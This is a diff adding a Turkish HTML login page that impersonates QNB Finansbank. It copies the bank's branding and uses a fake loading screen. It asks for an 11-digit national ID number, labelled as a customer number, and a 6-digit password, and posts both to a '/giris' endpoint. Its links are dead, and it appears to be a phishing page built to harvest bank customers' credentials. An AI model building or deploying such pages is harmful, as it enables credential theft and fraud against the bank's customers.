@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QNB Giriş</title>
+    <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">
+    <style>
+        :root {
+            --primary-color: #920874;
+            --primary-hover: #640650;
+            --background-gradient: linear-gradient(135deg, #000f33, #78014f);
+            --card-bg: rgba(255, 255, 255, 0.1);
+            --text-color: #fff;
+            --input-bg: rgba(255, 255, 255, 0.95);
+            --error-color: #ff6b6b;
+            --link-color: #a7c4ff;
+            --active-tab: #ffffff;
+            --inactive-tab: rgba(255, 255, 255, 0.6);
+            --tab-bg: rgba(255, 255, 255, 0.15);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--background-gradient);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            line-height: 1.6;
+        }
+
+        /* Loading Stilleri */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--background-gradient);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 500;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .login-container {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            padding: 2rem;
+            border-radius: 16px;
+            width: 420px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 0.5s ease forwards 0.5s;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .login-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.3);
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 2rem;
+            background: var(--tab-bg);
+            border-radius: 8px;
+            padding: 4px;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 0.8rem;
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--inactive-tab);
+            transition: all 0.3s ease;
+            border-radius: 6px;
+        }
+
+        .tab.active {
+            background: var(--active-tab);
+            color: var(--primary-color);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-group {
+            margin-bottom: 1.8rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.6rem;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.95rem;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 8px;
+            background: var(--input-bg);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            color: #333;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #999;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.25), inset 0 1px 3px rgba(0, 0, 0, 0.1);
+            background: white;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+        }
+
+        .required-message {
+            color: var(--error-color);
+            font-size: 0.8rem;
+            margin-top: 0.4rem;
+            display: block;
+            opacity: 0.9;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 1rem;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1rem;
+            margin-top: 0.8rem;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px #640650;
+        }
+
+        .login-button:hover:not(:disabled) {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 86, 179, 0.4);
+        }
+
+        .login-button:active:not(:disabled) {
+            transform: translateY(0);
+            box-shadow: 0 3px 8px rgba(0, 86, 179, 0.3);
+        }
+
+        .login-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+        }
+
+        .links a {
+            color: var(--link-color);
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+            padding-bottom: 2px;
+        }
+
+        .links a:hover {
+            color: white;
+        }
+
+        .links a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: white;
+            transition: width 0.3s ease;
+        }
+
+        .links a:hover::after {
+            width: 100%;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 3rem;
+            font-size: 0.8rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            padding-top: 1.5rem;
+            width: 100%;
+            max-width: 800px;
+            opacity: 0.8;
+        }
+
+        .footer a {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer p {
+            margin-bottom: 0.5rem;
+        }
+
+        .mobile-header {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        .mobile-kusak {
+            width: 225px;
+            height: auto;
+        }
+
+        .mobile-logo {
+            position: absolute;
+            top: 30px;
+            left: 25px;
+            width: 150px;
+        }
+
+        @media (max-width: 768px) {
+            .mobile-header {
+                display: block;
+                z-index: 0;
+            }
+
+            .login-container {
+                width: 90%;
+                margin-top: 120px;
+                padding: 1.8rem;
+            }
+        }
+        .error-message {
+            color: var(--error-color);
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <img src="assets/img/QNB_Loading_Icon.gif" alt="loading...">
+        <div class="loading-text">QNB Finansbank'a Hoş Geldiniz<br>Yükleniyor...</div>
+    </div>
+
+    <div class="mobile-header">
+        <img src="assets/img/mobil-kusak.png" alt="Mobil Kuşak" class="mobile-kusak">
+        <img src="assets/img/logo.png" alt="Logo" class="mobile-logo">
+    </div>
+
+    <div class="login-container">
+        <div class="tabs">
+            <div class="tab active" id="bireysel-tab">Bireysel</div>
+            <div class="tab" id="kurumsal-tab">Kurumsal</div>
+        </div>
+        <div id="form-error" class="error-message"></div>
+
+        <form id="login-form" method="POST" action="/giris">
+            <div class="form-group">
+                <label for="username">Müşteri Numaranız *</label>
+                <input type="text" id="username" name="tc" inputmode="numeric" required placeholder="Müşteri numaranızı girin" maxlength="11">
+                <div id="username-error" class="required-message" style="display: none;">Lütfen geçerli bir TC giriniz</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Şifre *</label>
+                <input type="password" id="password" inputmode="numeric" name="password" required placeholder="Şifrenizi girin" maxlength="6">
+                <div id="password-error" class="required-message" style="display: none;">Lütfen geçerli şifre giriniz</div>
+            </div>
+            
+            <button type="submit" class="login-button" id="login-button" disabled>GİRİŞ</button>
+        </form>
+
+        <div class="links">
+            <a href="#">Şifremi Unuttum</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p><strong>QNB Gizlilik Politikası</strong> | <strong>Kullanım Şartları</strong></p>
+        <p>Uyarı<br>
+            © 2025 QNB v4.1.23</p>
+    </div>
+
+    <script>
+        // Sayfa yüklendiğinde loading ekranını gizle
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                const loadingOverlay = document.getElementById('loading-overlay');
+                loadingOverlay.style.opacity = '0';
+                setTimeout(function() {
+                    loadingOverlay.style.display = 'none';
+                }, 500); // CSS transition süresiyle eşleşmeli
+            }, 1500); // 1.5 saniye loading ekranını göster
+        });
+
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('login-button');
+        const usernameError = document.getElementById('username-error');
+        const passwordError = document.getElementById('password-error');
+        const formError = document.getElementById('form-error');
+
+        // URL'de hata parametresi varsa göster
+        const urlParams = new URLSearchParams(window.location.search);
+        const errorParam = urlParams.get('error');
+        if (errorParam) {
+            formError.textContent = decodeURIComponent(errorParam);
+            formError.style.display = 'block';
+        }
+
+        // Başlangıçta buton pasif
+        loginButton.disabled = true;
+
+        // Kullanıcı numarasını kontrol et
+        usernameInput.addEventListener('input', validateForm);
+        
+        // Şifreyi kontrol et
+        passwordInput.addEventListener('input', validateForm);
+
+        // Form geçerliliğini kontrol et
+        function validateForm() {
+            // TC numarası kontrolü (11 karakter ve sadece sayı)
+            const isUsernameValid = usernameInput.value.length === 11 && /^\d+$/.test(usernameInput.value);
+            
+            // Şifre kontrolü (6 karakter)
+            const isPasswordValid = passwordInput.value.length === 6;
+            
+            // Hata mesajlarını güncelle
+            usernameError.style.display = isUsernameValid ? 'none' : 'block';
+            passwordError.style.display = isPasswordValid ? 'none' : 'block';
+            
+            // Buton durumunu güncelle
+            loginButton.disabled = !(isUsernameValid && isPasswordValid);
+        }
+
+        // Form gönderildiğinde ekstra kontrol
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            // Eğer buton disabled ise formun gönderilmesini engelle
+            if (loginButton.disabled) {
+                e.preventDefault();
+                formError.textContent = "Lütfen tüm alanları doğru şekilde doldurun";
+                formError.style.display = 'block';
+            }
+        });
+
+        const bireyselTab = document.getElementById("bireysel-tab");
+        const kurumsalTab = document.getElementById("kurumsal-tab");
+
+        bireyselTab.addEventListener("click", () => {
+            bireyselTab.classList.add("active");
+            kurumsalTab.classList.remove("active");
+        });
+
+        kurumsalTab.addEventListener("click", () => {
+            kurumsalTab.classList.add("active");
+            bireyselTab.classList.remove("active");
+        });
+    </script>
+</body>
+
+</html>
